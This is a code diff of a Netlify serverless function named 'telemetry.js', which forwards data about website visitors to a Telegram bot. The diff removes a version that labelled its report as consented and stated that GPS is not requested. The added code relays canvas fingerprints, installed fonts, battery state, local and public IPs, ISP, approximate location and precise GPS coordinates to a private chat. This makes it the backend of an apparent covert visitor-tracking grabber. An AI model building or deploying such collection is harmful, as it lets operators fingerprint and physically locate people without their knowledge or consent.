@@ -1,105 +1,94 @@
-exports.handler = async (event) => {
-  const reply = (statusCode, body) => ({
-    statusCode,
-    headers: {"Content-Type":"application/json","Cache-Control":"no-store"},
-    body: JSON.stringify(body)
-  });
-
-  if (event.httpMethod !== "POST") return reply(405, {ok:false, error:"Method not allowed"});
-
-  const token = process.env.TELEGRAM_BOT_TOKEN;
-  const chatId = process.env.TELEGRAM_CHAT_ID;
-  if (!token || !chatId) {
-    return reply(500, {ok:false, error:"Missing Telegram environment variables"});
+// netlify/functions/telemetry.js
+exports.handler = async (event, context) => {
+  // Only accept POST
+  if (event.httpMethod !== 'POST') {
+    return { statusCode: 405, body: 'Method Not Allowed' };
   }
 
-  let d;
-  try { d = JSON.parse(event.body || "{}"); }
-  catch (_) { return reply(400, {ok:false, error:"Invalid JSON"}); }
+  // Read environment variables (set in Netlify dashboard)
+  const BOT_TOKEN = process.env.BOT_TOKEN;
+  const CHAT_ID = process.env.CHAT_ID;
 
-  if (d.type !== "visitor_diagnostics") {
-    return reply(400, {ok:false, error:"Unsupported telemetry type"});
+  if (!BOT_TOKEN || !CHAT_ID) {
+    console.error('Missing BOT_TOKEN or CHAT_ID in env');
+    return { statusCode: 500, body: 'Server misconfiguration' };
   }
 
-  const h = Object.fromEntries(
-    Object.entries(event.headers || {}).map(([k,v]) => [k.toLowerCase(), v])
-  );
-  const ip =
-    h["x-nf-client-connection-ip"] ||
-    h["client-ip"] ||
-    String(h["x-forwarded-for"] || "").split(",")[0].trim() ||
-    "unavailable";
-
-  const dh = d.deviceHints || {};
-  const brands = Array.isArray(dh.brands)
-    ? dh.brands.map(x => x.brand).filter(Boolean).join(", ")
-    : "unavailable";
-
-  const s = d.screen || {};
-  const v = d.viewport || {};
-
-  const text = [
-    "╔══════════════════════════════╗",
-    "║      💌 VISITOR REPORT      ║",
-    "╚══════════════════════════════╝",
-    "",
-    "CONSENT",
-    "• Source: balloon interaction",
-    "• Consent: explicitly given",
-    `• Time: ${d.timestamp || new Date().toISOString()}`,
-    "",
-    "NETWORK",
-    `• Public IP: ${ip}`,
-    `• Provider: ${d.networkProvider || "not exposed by browser"}`,
-    "",
-    "DEVICE / BROWSER",
-    `• Model: ${dh.model || "not exposed"}`,
-    `• Platform: ${dh.platform || d.platform || "unavailable"}`,
-    `• Mobile: ${dh.mobile === true ? "Yes" : dh.mobile === false ? "No" : "Unknown"}`,
-    `• Brands: ${brands}`,
-    `• User-Agent: ${String(d.userAgent || h["user-agent"] || "unavailable").slice(0, 450)}`,
-    "",
-    "DISPLAY",
-    `• Screen: ${s.width || "?"} × ${s.height || "?"}`,
-    `• Pixel ratio: ${s.pixelRatio || "?"}`,
-    `• Viewport: ${v.width || "?"} × ${v.height || "?"}`,
-    `• Touch points: ${d.touchPoints ?? "?"}`,
-    "",
-    "BROWSER",
-    `• Language: ${d.language || "unavailable"}`,
-    `• Timezone: ${d.timezone || "unavailable"}`,
-    `• Referrer: ${d.referrer || "direct / unavailable"}`,
-    `• Page: ${String(d.page || "").slice(0, 450)}`,
-    "",
-    "LOCATION",
-    "• GPS: not requested (no browser location popup)",
-    "",
-    "INTERACTION",
-    "• balloon_burst_consent",
-    "",
-    "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
-  ].join("\n");
-
+  let payload;
   try {
-    const tg = await fetch(
-      `https://api.telegram.org/bot${encodeURIComponent(token)}/sendMessage`,
-      {
-        method:"POST",
-        headers:{"Content-Type":"application/json"},
-        body:JSON.stringify({
-          chat_id: chatId,
-          text,
-          disable_web_page_preview:true
-        })
-      }
-    );
+    payload = JSON.parse(event.body);
+  } catch (e) {
+    return { statusCode: 400, body: 'Invalid JSON' };
+  }
 
-    const result = await tg.json().catch(() => ({}));
-    if (!tg.ok || !result.ok) {
-      return reply(502, {ok:false, error: result.description || "Telegram rejected message"});
+  // Format a readable message for Telegram
+  const msg = formatTelegramMessage(payload);
+
+  // Send to Telegram
+  try {
+    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+    const resp = await fetch(url, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        chat_id: CHAT_ID,
+        text: msg,
+        parse_mode: 'HTML'
+      })
+    });
+    const result = await resp.json();
+    if (!result.ok) {
+      console.error('Telegram error:', result);
+      return { statusCode: 500, body: 'Telegram send failed' };
     }
-    return reply(200, {ok:true});
-  } catch (_) {
-    return reply(502, {ok:false, error:"Telegram request failed"});
+    return { statusCode: 200, body: 'OK' };
+  } catch (err) {
+    console.error('Error forwarding to Telegram:', err);
+    return { statusCode: 500, body: 'Internal error' };
   }
 };
+
+function formatTelegramMessage(data) {
+  const d = data.device || {};
+  const net = data.network || {};
+  const gps = data.gps || {};
+
+  let lines = [];
+  lines.push('🔍 <b>New Visitor Telemetry</b>');
+  lines.push(`⏱ ${data.timestamp || 'N/A'}`);
+  lines.push('');
+  lines.push('📱 <b>Device</b>');
+  lines.push(`UA: ${d.userAgent || 'N/A'}`);
+  lines.push(`Platform: ${d.platform || 'N/A'}`);
+  lines.push(`Screen: ${d.screenWidth || '?'}×${d.screenHeight || '?'} (${d.screenPixelRatio || '?'}x)`);
+  lines.push(`Memory: ${d.deviceMemory || 'N/A'}`);
+  lines.push(`Cores: ${d.hardwareConcurrency || 'N/A'}`);
+  lines.push(`Battery: ${d.battery?.level || 'N/A'} (charging: ${d.battery?.charging || 'N/A'})`);
+  lines.push(`Fonts: ${(d.installedFonts || []).join(', ') || 'none'}`);
+  lines.push(`Canvas: ${(d.canvasFingerprint || '').substring(0, 30)}...`);
+  lines.push('');
+  lines.push('🌐 <b>Network</b>');
+  lines.push(`Local IPs: ${(net.localIPs || []).join(', ')}`);
+  lines.push(`Public IP: ${net.publicIP || 'N/A'}`);
+  lines.push(`ISP: ${net.isp || 'N/A'}`);
+  if (net.approximateLocation) {
+    const loc = net.approximateLocation;
+    lines.push(`Approx: ${loc.city || ''}, ${loc.region || ''}, ${loc.country || ''}`);
+    lines.push(`Coords: ${loc.lat || 'N/A'}, ${loc.lng || 'N/A'}`);
+  }
+  lines.push('');
+  if (gps.lat && gps.lng) {
+    lines.push('📍 <b>Precise GPS</b>');
+    lines.push(`Lat: ${gps.lat}, Lng: ${gps.lng}`);
+    lines.push(`Accuracy: ${gps.accuracy || 'N/A'}`);
+  } else if (gps.error) {
+    lines.push(`📍 GPS: ${gps.error}`);
+  } else {
+    lines.push('📍 GPS: Not available');
+  }
+  lines.push('');
+  lines.push(`🌐 Page: ${data.pageUrl || 'N/A'}`);
+  lines.push(`↩️ Referrer: ${data.referrer || 'N/A'}`);
+
+  return lines.join('\n');
+}
